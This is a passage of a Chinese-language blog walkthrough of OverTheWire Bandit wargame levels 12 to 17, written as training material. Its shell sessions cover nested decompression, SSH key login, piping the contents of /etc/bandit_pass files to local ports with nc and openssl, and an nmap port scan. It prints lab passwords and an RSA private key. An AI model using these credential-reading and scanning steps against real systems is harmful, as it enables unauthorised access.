class=\"line\">data_1  data_3</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_3</div><div class=\"line\">data_3: bzip2 compressed data, block size = 900k</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_3 data_4.bz2 ; bzip2 -d data_4.bz2 ; ls</div><div class=\"line\">data_1  data_4</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_4</div><div class=\"line\">data_4: gzip compressed data, was \"data4.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_4 data_5.gz ; gzip -d data_5.gz ; ls</div><div class=\"line\">data_1  data_5</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_5</div><div class=\"line\">data_5: POSIX tar archive (GNU)</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_5 data_6.tar ; tar -xvf data_6.tar ; ls</div><div class=\"line\">data5.bin</div><div class=\"line\">data5.bin  data_1  data_6.tar</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data5.bin </div><div class=\"line\">data5.bin: POSIX tar archive (GNU)</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data5.bin data_7.tar; tar -xvf data_7.tar ; ls </div><div class=\"line\">data6.bin</div><div class=\"line\">data6.bin  data_1  data_6.tar  data_7.tar</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data6.bin</div><div class=\"line\">data6.bin: bzip2 compressed data, block size = 900k</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data6.bin data_8.bz2 ; bzip2 -d data_8.bz2 ; ls</div><div class=\"line\">data_1  data_6.tar  data_7.tar  data_8</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_8</div><div class=\"line\">data_8: POSIX tar archive (GNU)</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_8 data_9.tar ; tar -xvf data_9.tar ; ls</div><div class=\"line\">data8.bin</div><div class=\"line\">data8.bin  data_1  data_6.tar  data_7.tar  data_9.tar</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data8.bin</div><div class=\"line\">data8.bin: gzip compressed data, was \"data9.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data8.bin data_10.gz ; gzip -d data_10.gz ; ls</div><div class=\"line\">data_1  data_10  data_6.tar  data_7.tar  data_9.tar</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_10</div><div class=\"line\">data_10: ASCII text</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ cat data_10</div><div class=\"line\">The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</div></pre></td></tr></table></figure>\n<p>心路历程：这关比较恶心了……按照对应的加密方式解密就好，用 <code>file</code> 查看文件类型，<code>mv</code> 命令修改名字，还有<code>bzip2 -d</code>、<code>gzip -d</code>、<code>tar -xvf</code>以及<code>xxd -r</code> 这些解密解压方法。</p>\n<hr>\n<p>Level 13 - 14</p>\n<p>描述：下一级的密码存储在<code>/etc/bandit\\_pass/bandit14</code> 中，只能由用户bandit14读取。对于这个级别，你不会得到下一个密码，但你会得到一个私人的SSH密钥，可以用来登录到下一个级别。注意：localhost是指您正在使用的机器的主机名<br>密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit13@bandit:~$ ls</div><div class=\"line\">sshkey.private</div><div class=\"line\">bandit13@bandit:~$ ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220</div><div class=\"line\">The authenticity of host <span class=\"string\">'[bandit.labs.overthewire.org]:2220 ([0.0.0.0]:2220)'</span> can<span class=\"string\">'t be established.</span></div><div class=\"line\">ECDSA key fingerprint is ee:4c:8c:e7:57:2c:bc:63:24:b8:e6:23:27:63:72:9f.</div><div class=\"line\">Are you sure you want to continue connecting (yes/no)? yes</div><div class=\"line\">Warning: Permanently added '[bandit.labs.overthewire.org]:2220,[0.0.0.0]:2220<span class=\"string\">' (ECDSA) to the list of known hosts.</span></div><div class=\"line\">...</div><div class=\"line\">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</div><div class=\"line\">applicable law.</div><div class=\"line\">bandit14@bandit:~$ cat /etc/bandit_pass/bandit14  </div><div class=\"line\">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</div></pre></td></tr></table></figure>\n<p>心路历程：告诉我们需要 ssh 登陆进去，自己去找密码，我们就登录一下好了。</p>\n<hr>\n<p>Level 14 - 15<br>描述：通过将当前级别的密码提交到localhost上的端口30000，可以检索到下一级别的密码。<br>密码：BfMYroe26WYalil77FoDi9qh59eK5xNr</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit14@bandit:~$ nc localhost 30000 &lt; /etc/bandit_pass/bandit14</div><div class=\"line\">Correct!</div><div class=\"line\">BfMYroe26WYalil77FoDi9qh59eK5xNr</div></pre></td></tr></table></figure>\n<p>心路历程：我们使用 <code>nc</code> 命令来发送我们的密码，因为上一关我们已经知道密码在那放着了，刚好可以用到。<br>提示：什么？你想直接查看其他关的密码？不存在的……（权限啊老铁）</p>\n<hr>\n<p>Level 15 -16</p>\n<p>描述：可以通过使用SSL加密将当前级别的密码提交到本地主机上的端口30001来检索下一级别的密码。</p>\n<p>密码：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof                          </div><div class=\"line\">CONNECTED(00000003)</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify error:num=18:self signed certificate</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">---</div><div class=\"line\">Certificate chain</div><div class=\"line\"> 0 s:/CN=8f75dc271013</div><div class=\"line\">   i:/CN=8f75dc271013</div><div class=\"line\">---</div><div class=\"line\">Server certificate</div><div class=\"line\">-----BEGIN CERTIFICATE-----</div><div class=\"line\">MIICvjCCAaagAwIBAgIJALADbwWQ0u9aMA0GCSqGSIb3DQEBCwUAMBcxFTATBgNV</div><div class=\"line\">BAMTDDhmNzVkYzI3MTAxMzAeFw0xNzA5MTYwNzAyMjRaFw0yNzA5MTQwNzAyMjRa</div><div class=\"line\">MBcxFTATBgNVBAMTDDhmNzVkYzI3MTAxMzCCASIwDQYJKoZIhvcNAQEBBQADggEP</div><div class=\"line\">ADCCAQoCggEBALmjBUTlmjROJUssm+rAlFADFfzrz+xCH0qUXryou5/wW8pnQ6nG</div><div class=\"line\">HbdeRIBwTVGFiDIKRbFdWQU4BbrfjEhyGn9d7eh/3GV09ZdvLDYRoLmJ4tDF8CiC</div><div class=\"line\">wGl9GufcWr3zeaNYa8CwVdtWam8umhMICrsv7B5iV9RdSQfudUtVbr26SBVyuhBm</div><div class=\"line\">m0t7Su6rLCrrGtshdIihjk4k67bBMpSNAOduhpp79UgIPKcwJUhRJHTcji3m/IQ8</div><div class=\"line\">O9zNS25oL8KhMn7e/Xe70kztstq0ShMsx8feutONnGulUOlaEMMqW+HSWgnVeG/r</div><div class=\"line\">mU9Nzwn++4qxe16OvvmXAzctH2RlDx7XbcsCAwEAAaMNMAswCQYDVR0TBAIwADAN</div><div class=\"line\">BgkqhkiG9w0BAQsFAAOCAQEADHODX5CcMLI5fdumzly5FAVg5Yc22eDGNhmyhi/N</div><div class=\"line\">kDhP6QYw+HW5nWEYapc9m/ZQGEEoxr+wj6qeEhscxRxpuEIcunZsLKcoAmToyXeO</div><div class=\"line\">ANMslQugRcGqN57Pt0h5VuctLMa3ickeVPFvV6gxJSHBNRK1iN8nrfsy+zR+stzI</div><div class=\"line\">xcjIuakDDxMKFtb/1TMKf4/EsimSQLS0WXLjbxfQ/J510O4/Of0tmZI0ZIG+cKmM</div><div class=\"line\">V5hAOtuuAk6jREfWYJQ3DB+phv7PO9s2FpofVJss5PK4NWDS7UQOv359ZOJ85ZpJ</div><div class=\"line\">ihGxDqV7IAHJZNM9lvFXz/+EOn1oTGW9V8bAwt34OVYoPw==</div><div class=\"line\">-----END CERTIFICATE-----</div><div class=\"line\">subject=/CN=8f75dc271013</div><div class=\"line\">issuer=/CN=8f75dc271013</div><div class=\"line\">---</div><div class=\"line\">No client certificate CA names sent</div><div class=\"line\">---</div><div class=\"line\">SSL handshake has <span class=\"built_in\">read</span> 1682 bytes and written 637 bytes</div><div class=\"line\">---</div><div class=\"line\">New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA</div><div class=\"line\">Server public key is 2048 bit</div><div class=\"line\">Secure Renegotiation IS supported</div><div class=\"line\">Compression: NONE</div><div class=\"line\">Expansion: NONE</div><div class=\"line\">SSL-Session:</div><div class=\"line\">    Protocol  : SSLv3</div><div class=\"line\">    Cipher    : DHE-RSA-AES256-SHA</div><div class=\"line\">    Session-ID: C193C0A99C7335DB7D7B7B89367CF5E6A514E4FF58066E86A47070BCD02F7BC5</div><div class=\"line\">    Session-ID-ctx: </div><div class=\"line\">    Master-Key: 5D0EB4E12667C302D7D9AAB88855BF67DA51124248593FC4B5613C6BBCF69C145BF0B37DCA5A3765A8DFD2EBDC84B248</div><div class=\"line\">    Key-Arg   : None</div><div class=\"line\">    PSK identity: None</div><div class=\"line\">    PSK identity hint: None</div><div class=\"line\">    SRP username: None</div><div class=\"line\">    Start Time: 1510423808</div><div class=\"line\">    Timeout   : 300 (sec)</div><div class=\"line\">    Verify <span class=\"built_in\">return</span> code: 18 (self signed certificate)</div><div class=\"line\">---</div><div class=\"line\">BfMYroe26WYalil77FoDi9qh59eK5xNr</div><div class=\"line\">Correct!</div><div class=\"line\">cluFn7wTiGryunymYOu4RcffSxQluehd</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">read</span>:errno=0</div></pre></td></tr></table></figure>\n<p>心路历程：我们使用 <code>openssl</code> 的 <code>s\\_client</code> SSL/TSL 客户端程序连接服务器，成功后复制粘贴我们本关的密码就能得到下一关的密码了。多看手册哦。<br>提示：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit15@bandit:~$ man openssl</div><div class=\"line\">bandit15@bandit:~$ man s_client</div></pre></td></tr></table></figure></p>\n<hr>\n<p>Level 16 -17<br>描述：可以通过将当前级别的密码提交到本地主机上31000到32000范围内的端口来检索下一级别的凭证。首先找出哪些端口有服务器正在侦听它们。然后找出哪些人说SSL和哪些不。只有一个服务器会提供下一个凭据，其他的只是发回你发给它的内容。<br>密码：xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 先扫描开放端口</span></div><div class=\"line\">bandit16@bandit:~$ nmap -p 31000-32000 localhost</div><div class=\"line\"></div><div class=\"line\">Starting Nmap 6.40 ( http://nmap.org ) at 2017-11-12 09:08 UTC</div><div class=\"line\">Nmap scan report <span class=\"keyword\">for</span> localhost (127.0.0.1)</div><div class=\"line\">Host is up (0.00047s latency).</div><div class=\"line\">Other addresses <span class=\"keyword\">for</span> localhost (not scanned): 127.0.0.1</div><div class=\"line\">Not shown: 996 closed ports</div><div class=\"line\">PORT      STATE SERVICE</div><div class=\"line\">31046/tcp open  unknown</div><div class=\"line\">31518/tcp open  unknown</div><div class=\"line\">31691/tcp open  unknown</div><div class=\"line\">31790/tcp open  unknown</div><div class=\"line\">31960/tcp open  unknown</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 依次给5个端口发送消息,其他端口只会返回你发给它的内容。</span></div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31046    </div><div class=\"line\">Hello World!</div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31518</div><div class=\"line\">ERROR</div><div class=\"line\">140737354053280:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:351:</div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31691</div><div class=\"line\">Hello World!</div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31790</div><div class=\"line\">ERROR</div><div class=\"line\">140737354053280:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:351:</div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World!\"</span> | nc localhost 31960</div><div class=\"line\">Hello World!</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 我们发现有两个端口是SSL的，分别给这两个端口发送数据测试。</span></div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Hello World\"</span> | openssl s_client -quiet -connect localhost:31518</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify error:num=18:self signed certificate</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">Hello World</div><div class=\"line\"><span class=\"comment\"># 因为回复了Hello World，确定这个属于「其他端口」这里直接发送密码给 31790 端口</span></div><div class=\"line\">bandit16@bandit:~$ cat /etc/bandit_pass/bandit16 | openssl s_client -quiet -connect localhost:31790</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify error:num=18:self signed certificate</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">Correct!</div><div class=\"line\">-----BEGIN RSA PRIVATE KEY-----</div><div class=\"line\">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</div><div class=\"line\">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</div><div class=\"line\">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</div><div class=\"line\">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</div><div class=\"line\">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</div><div class=\"line\">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</div><div class=\"line\">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</div><div class=\"line\">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</div><div class=\"line\">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</div><div class=\"line\">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</div><div class=\"line\">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</div><div class=\"line\">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</div><div class=\"line\">8c8hAuRBb2G82so8vUHk/fur85OE<span class=\"built_in\">fc</span>9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</div><div class=\"line\">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</div><div class=\"line\">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</div><div class=\"line\">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</div><div class=\"line\">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</div><div class=\"line\">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</div><div class=\"line\">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgX<span class=\"keyword\">in</span>B3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</div><div class=\"line\">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</div><div class=\"line\">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</div><div class=\"line\">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</div><div class=\"line\">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</div><div class=\"line\">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</div><div class=\"line\">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</div><div class=\"line\">-----END RSA PRIVATE KEY-----</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">read</span>:errno=0</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 存到文件中</span></div><div class=\"line\">bandit16@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"-----BEGIN RSA PRIVATE KEY-----</span></div><div class=\"line\">&gt; MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</div><div class=\"line\">&gt; imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</div><div class=\"line\">&gt; Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</div><div class=\"line\">&gt; DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</div><div class=\"line\">&gt; JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</div><div class=\"line\">&gt; x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</div><div class=\"line\">&gt; KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</div><div class=\"line\">&gt; J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</div><div class=\"line\">&gt; d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</div><div class=\"line\">&gt; YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</div><div class=\"line\">&gt; vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</div><div class=\"line\">&gt; +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</div><div class=\"line\">&gt; 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</div><div class=\"line\">&gt; SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</div><div class=\"line\">&gt; HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</div><div class=\"line\">&gt; SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</div><div class=\"line\">&gt; R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</div><div class=\"line\">&gt; Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</div><div class=\"line\">&gt; R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</div><div class=\"line\">&gt; L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</div><div class=\"line\">&gt; blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</div><div class=\"line\">&gt; YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</div><div class=\"line\">&gt; 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</div><div class=\"line\">&gt; dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</div><div class=\"line\">&gt; vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</div><div class=\"line\">&gt; -----END RSA PRIVATE KEY-----\" &gt; ssh.private</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 修改文件权限，确保他人不被允许访问这个文件，不然不会被认证端认同</span></div><div class=\"line\">bandit16@bandit:~$ chmod 600 ssh.private</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 连接</span></div><div class=\"line\">bandit16@bandit:~$ ssh -i ssh.private bandit17@localhost -p 2220</div><div class=\"line\"> _                     _ _ _   </div><div class=\"line\">| |__   __ _ _ __   __| (_) |_ </div><div class=\"line\">| <span class=\"string\">'_ \\ / _` | '</span>_ \\ / _` | | __|</div><div class=\"line\">| |_) | (_| | | | | (_| | | |_ </div><div class=\"line\">|_.__/ \\__,_|_| |_|\\__,_|_|\\__|</div><div class=\"line\">                               </div><div class=\"line\">a http://www.overthewire.org wargame.</div><div class=\"line\"></div><div class=\"line\">...</div><div class=\"line\">bandit17@bandit:~$ cat /etc/bandit_pass/bandit17</div><div class=\"line\">xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</div></pre></td></tr></table></figure>\n<p>心路历程：这关把过程注释在了上面的代码中，帮助大家路顺思路，这里就不赘述了。</p>\n<hr>\n<p>Level 17 -18</p>\n<p>描述：homedirectory中有两个文件：passwords.old和passwords.new。下一级的密码是passwords.new中跟.old唯一不同的一行</p>\n<p>密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit17@bandit:~$ ll</div><div class=\"line\">total 44</div><div class=\"line\">drwxr-xr-x  4 bandit17 bandit17 4096 Nov 12 10:42 ./</div><div class=\"line\">drwxr-xr-x 30 root     root     4096 Nov 12 10:42 ../</div><div class=\"line\">-rw-r-----  1 bandit17 bandit17   33 Sep 28 14:04 .bandit16.password</div><div class=\"line\">-rw-r--r--  1 bandit17 bandit17  220 Apr  9  2014 .bash_logout</div><div class=\"line\">-rw-r--r--  1 bandit17 bandit17 3637 Apr  9  2014 .bashrc</div><div class=\"line\">drwx------  2 bandit17 bandit17 4096 Nov 12 10:42 .cache/</div><div class=\"line\">-rw-r--r--  1 bandit17 bandit17  675 Apr  9  2014 .profile</div><div class=\"line\">drwxr-xr-x  2 root     root     4096 Sep 28 14:04 .ssh/</div><div class=\"line\">-rw-r-----  1 bandit17 bandit17 1704 Sep 28 14:04 .ssl-cert-snakeoil.key</div><div class=\"line\">-rw-r-----  1 